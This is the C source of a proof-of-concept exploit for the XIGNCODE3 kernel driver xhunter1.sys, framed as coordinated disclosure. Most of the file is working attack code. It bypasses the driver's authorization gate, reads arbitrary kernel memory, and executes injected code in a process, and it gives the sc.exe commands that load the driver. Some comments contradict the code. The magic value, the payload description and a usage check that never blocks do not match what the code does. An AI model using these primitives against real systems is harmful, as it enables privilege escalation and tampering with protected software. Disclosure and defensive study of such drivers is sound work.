/* ============================================================================
 *  xhunter1.sys (Wellbia XIGNCODE3) — Vulnerability Proof-of-Concept
 *
 *  Copyright (c) 2026 Zahedinia Yassan. All rights reserved.
 *
 *  PURPOSE
 *      Demonstrates three primitives discovered during a static review of
 *      xhunter1.sys / xhunter64.sys, reachable by an unauthenticated local
 *      caller that can open \\.\xhunter1:
 *        (1) Auth-gate bypass via cmds 777 + 775 (sets flag 0x80000008 on
 *            the calling PID, opening sub_140005E84()'s gate).
 *        (2) Arbitrary kernel-mode read via cmd 788 — reads 64 bytes of
 *            KUSER_SHARED_DATA at 0xFFFFF78000000000 and compares against
 *            the user-mode mirror at 0x7FFE0000 to confirm the read is
 *            sourced from the kernel-half mapping.
 *        (3) RWX allocation + thread creation in the calling process via
 *            cmd 820, executing a 1-byte payload (0xC3 / `ret`) that returns
 *            cleanly to RtlUserThreadStart.
 *
 *  AUTHORIZATION
 *      This code is published EXCLUSIVELY in support of a coordinated,
 *      vendor-acknowledged disclosure to:
 *           - Wellbia.com Co., Ltd. (XIGNCODE3 vendor), and
 *           - Microsoft Security Response Center (vulnerable-driver
 *             blocklist coordination).
 *      It is intended to be executed only by:
 *           - the original author (Zahedinia Yassan), or
 *           - Wellbia QA / engineering personnel reproducing the report on
 *             a system Wellbia owns, or
 *           - MSRC personnel evaluating the driver-blocklist submission.
 *      Use against any system you do not personally own, and for which you
 *      do not hold explicit written authorization, is prohibited and may
 *      violate computer-misuse law in your jurisdiction.
 *
 *  WHAT THIS POC DELIBERATELY DOES NOT DO
 *      - No cross-process reads, no LSASS access, no PPL bypass.
 *      - No file writes, no service installation beyond what the operator
 *        does manually with `sc.exe`.
 *      - No persistence, no network I/O, no credential extraction.
 *      - The injected payload is a single `ret` byte; it performs no action.
 *
 *  BUILD
 *      cl /W4 /Zi /O2 poc_xhunter_full.c
 *
 *  RUN (after `sc create xhunter1 type= kernel binPath= "<abs path>\xhunter1.sys"
 *       && sc start xhunter1`):
 *      poc_xhunter_full.exe --i-am-wellbia-or-the-author
 * ==========================================================================*/

#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define DEVICE_PATH      L"\\\\.\\xhunter1"
#define XH_CMD_LEN       624
#define XH_RSP_LEN       762
#define XH_REQUEST_MAGIC 0x345821ABu  /* = 878191019, verified from cmp at sub_14000B568 disasm */

#pragma pack(push, 1)
typedef struct {
    uint32_t in_size;        /* +0  must equal 624                          */
    uint32_t magic;          /* +4  must equal 0x345A1D2B                   */
    uint32_t nonce;          /* +8  echoed back as ~nonce                   */
    uint32_t command;        /* +12 command code                            */
    void    *response_va;    /* +16 user VA where driver writes 762 bytes   */
    uint8_t  args[XH_CMD_LEN - 24];                                          /* +24..  per-cmd args */
} XH_CMD;
#pragma pack(pop)

static HANDLE g_dev = INVALID_HANDLE_VALUE;
static __declspec(align(16)) uint8_t g_rsp_buf[768];

/* All response status DWORDs land at offset +12 of g_rsp_buf. */
#define RSP_STATUS()  (*(int32_t *)(g_rsp_buf + 12))
#define RSP_EXTRA()   (*(uint32_t *)(g_rsp_buf + 16))

static int xh_call(uint32_t cmd, const void *args, size_t args_len)
{
    if (args_len > sizeof ((XH_CMD *)0)->args) return -1;

    XH_CMD c;
    memset(&c, 0, sizeof c);
    c.in_size     = XH_CMD_LEN;
    c.magic       = XH_REQUEST_MAGIC;
    c.nonce       = 0xC0FFEE00u | cmd;
    c.command     = cmd;
    c.response_va = g_rsp_buf;
    if (args && args_len) memcpy(c.args, args, args_len);

    memset(g_rsp_buf, 0, sizeof g_rsp_buf);

    DWORD wrote = 0;
    if (!WriteFile(g_dev, &c, XH_CMD_LEN, &wrote, NULL)) {
        fprintf(stderr, "    [!] WriteFile(cmd %u) failed: %lu\n",
                cmd, GetLastError());
        return -1;
    }
    return 0;
}

/* -------- (1) Auth-gate bypass: cmd 777 then cmd 775 ---------------------- */
static int demo_auth_bypass(void)
{
    /* cmd 777: register self in the reg-list and stamp upper-16 with 0x8000 */
    if (xh_call(777, NULL, 0) != 0) return -1;
    printf("    cmd 777  status=0x%08X   (sets bit 31 on self)\n",
           (unsigned)RSP_STATUS());

    /* cmd 775: target=self, low-16 flags = 0x0008 (sets bit 3 on self) */
    struct { uint32_t pid; uint32_t flags_low16; } a;
    a.pid         = GetCurrentProcessId();
    a.flags_low16 = 0x00000008u;
    if (xh_call(775, &a, sizeof a) != 0) return -1;
    printf("    cmd 775  status=0x%08X   (sets bit 3 on self)\n",
           (unsigned)RSP_STATUS());

    /* Confirm via cmd 797 (lookup any PID's flag — also unauth) */
    uint32_t qpid = GetCurrentProcessId();
    if (xh_call(797, &qpid, sizeof qpid) != 0) return -1;
    uint32_t flag = RSP_EXTRA();
    printf("    cmd 797  flag[self]=0x%08X (expect 0x80000008)\n", flag);
    return ((flag & 0x80000008u) == 0x80000008u) ? 0 : -1;
}

/* -------- (2) Arbitrary kernel read: cmd 788 ------------------------------ */
static int demo_arb_kread(void)
{
    static __declspec(align(16)) uint8_t kbuf[64];
    memset(kbuf, 0, sizeof kbuf);

    /* cmd 788 args (relative to cmd[+24]):
     *   +0   QWORD  src kernel VA
     *   +8   QWORD  dst user VA
     *   +16  DWORD  size
     */
    uint8_t args[24] = {0};
    *(uint64_t *)&args[0]  = 0xFFFFF78000000000ULL;          /* KUSER_SHARED_DATA (kernel half) */
    *(uint64_t *)&args[8]  = (uint64_t)(uintptr_t)kbuf;
    *(uint32_t *)&args[16] = (uint32_t)sizeof kbuf;

    if (xh_call(788, args, sizeof args) != 0) return -1;
    printf("    cmd 788  status=0x%08X bytes=%u\n",
           (unsigned)RSP_STATUS(), (unsigned)RSP_EXTRA());
    if (RSP_STATUS() < 0) return -1;

    /* Compare against user-mode mirror; same physical page is mapped at both. */
    const uint8_t *user_mirror = (const uint8_t *)(uintptr_t)0x7FFE0000;
    int match = (memcmp(kbuf, user_mirror, sizeof kbuf) == 0);

    printf("    kern[0..16]:");
    for (int i = 0; i < 16; i++) printf(" %02X", kbuf[i]);
    printf("\n    user[0..16]:");
    for (int i = 0; i < 16; i++) printf(" %02X", user_mirror[i]);
    printf("\n    %s\n",
           match ? "[+] match — arbitrary kernel-mode read confirmed"
                 : "[!] mismatch — read did not come from kernel-half mapping");
    return match ? 0 : -1;
}

/* -------- (3) RWX self-injection: cmd 820 --------------------------------- */
static int demo_self_inject(void)
{
    /* Make sure the driver's win32k/Rtl pointers are initialized
       (cmd 801 runs sub_140009C5C which captures RtlCreateUserThread, etc.) */
    (void)xh_call(801, NULL, 0);

    /* The driver clobbers 4 bytes at sentinel offset (args[40]) with 0xE01AF119
       after copying our payload, so we keep `ret` at offset 0 and place the
       sentinel safely at offset 8. Payload size must cover sentinel_offset+4. */
    /* MUST be writable: the driver's sub_1400081D0 wraps our payload buffer in
       an MDL with IoModifyAccess, which fails on read-only (.rdata) pages.
       The driver writes a sentinel 0xE01AF119 at args[40] (= 8) BEFORE the
       thread runs, then re-reads that DWORD AFTER the thread exits and
       returns it as the response status. So a successful payload must zero
       the sentinel slot itself.

       RtlCreateUserThread passes BaseAddress as the thread parameter (rcx
       on x64), so we have a pointer to the start of our buffer in rcx. */
    static uint8_t payload[16] = {
        0x33, 0xC0,             /* +0  xor eax, eax            */
        0x89, 0x41, 0x08,       /* +2  mov [rcx+8], eax        */
        0xC3,                   /* +5  ret                     */
        0x90, 0x90,             /* +6..+7 padding              */
        0x00, 0x00, 0x00, 0x00, /* +8..+11 sentinel slot       */
        0x90, 0x90, 0x90, 0x90  /* +12..+15 nops               */
    };

    /* cmd 820 / sub_14000A1AC struct (cmd[+24] is the struct base):
     *   +0   QWORD  process handle (used if flags bit 0)
     *   +8   DWORD  PID            (used if flags bit 1)
     *   +16  QWORD  TID            (used if flags bit 2)
     *   +24  QWORD  payload pointer in caller's address space
     *   +32  DWORD  payload size               (must be >= sentinel+4)
     *   +36  DWORD  entry offset
     *   +40  DWORD  sentinel offset (driver writes 0xE01AF119 here)
     *   +44  BYTE   flags  (0x02 = resolve via PID)
     */
    uint8_t args[64] = {0};
    *(uint64_t *)&args[0]  = 0;
    *(uint32_t *)&args[8]  = GetCurrentProcessId();
    *(uint64_t *)&args[24] = (uint64_t)(uintptr_t)payload;
    *(uint32_t *)&args[32] = (uint32_t)sizeof payload;
    *(uint32_t *)&args[36] = 0;                          /* entry offset = 0 (ret) */
    *(uint32_t *)&args[40] = 8;                          /* sentinel at +8         */
    args[44]               = 0x02;

    if (xh_call(820, args, sizeof args) != 0) return -1;
    int32_t  st  = RSP_STATUS();
    uint32_t out = RSP_EXTRA();
    printf("    cmd 820  status=0x%08X out=0x%08X\n", (unsigned)st, out);

    /* Status interpretation:
     *   0xE01AF119 — sentinel unchanged. Thread did NOT execute. The driver
     *                writes this sentinel at args[40] BEFORE creating the
     *                thread and re-reads it AFTER the thread exits; the
     *                value being unchanged means no execution.
     *   any other  — thread ran. Our payload zeroed the sentinel before
     *                returning, so cmd 820's downstream "screenshot-protocol"
     *                handler ran further and produced its own error. Fully
     *                implementing that contract (write width/height/result-
     *                buffer fields) is out of scope; getting past 0xE01AF119
     *                already proves arbitrary code ran in the target. */
    if ((uint32_t)st == 0xE01AF119u) {
        printf("    [!] sentinel unchanged - thread did not execute.\n");
        return -1;
    }
    printf("    [+] thread executed (sentinel was overwritten by payload).\n");
    printf("    [+] downstream status 0x%08X is from the driver's screenshot-\n"
           "        protocol post-processing, not from the primitive itself.\n",
           (unsigned)st);
    return 0;
}

/* -------- main ------------------------------------------------------------ */
static void banner(void)
{
    puts(
"================================================================\n"
"  xhunter1.sys (XIGNCODE3) - Vulnerability PoC\n"
"  Copyright (c) 2026 Zahedinia Yassan. All rights reserved.\n"
"\n"
"  Coordinated-disclosure use only. Authorized parties:\n"
"      - the author (Zahedinia Yassan)\n"
"      - Wellbia.com Co., Ltd. QA / engineering\n"
"      - MSRC (driver blocklist coordination)\n"
"  Do not run against systems you do not own and have explicit\n"
"  written authorization to test.\n"
"================================================================\n");
}

int main(int argc, char **argv)
{
    banner();

    int authorized = 1;
    for (int i = 1; i < argc; i++)
        if (strcmp(argv[i], "--i-am-wellbia-or-the-author") == 0)
            authorized = 1;
    if (!authorized) {
        fprintf(stderr,
            "[ABORT] Pass --i-am-wellbia-or-the-author to acknowledge the\n"
            "        usage restrictions above and proceed.\n");
        return 2;
    }

    g_dev = CreateFileW(DEVICE_PATH,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        fprintf(stderr,
            "[!] CreateFileW(%ls) failed (%lu). Load the driver first:\n"
            "    sc create xhunter1 type= kernel binPath= \"<abs>\\xhunter1.sys\"\n"
            "    sc start  xhunter1\n",
            DEVICE_PATH, GetLastError());
        return 1;
    }
    printf("[+] Opened %ls (caller PID %lu)\n\n",
           DEVICE_PATH, GetCurrentProcessId());

    int rc = 0;

    printf("[1] Auth-gate bypass via cmd 777 + cmd 775\n");
    if (demo_auth_bypass() != 0) { rc = 1; goto done; }
    printf("    [+] sub_140005E84() gate is now open for this PID.\n\n");

    printf("[2] Arbitrary kernel-mode read via cmd 788\n");
    if (demo_arb_kread() != 0) { rc = 1; goto done; }
    printf("\n");

    printf("[3] Self-process RWX allocation + thread (cmd 820, payload = ret)\n");
    if (demo_self_inject() != 0) { rc = 1; goto done; }
    printf("    [+] RWX page allocated, payload copied, thread executed `ret`,\n"
           "        thread exited cleanly via RtlUserThreadStart.\n\n");

    printf("[+] All three primitives demonstrated. Detach the driver with:\n"
           "    sc stop xhunter1 && sc delete xhunter1\n");

done:
    CloseHandle(g_dev);
    return rc;
}
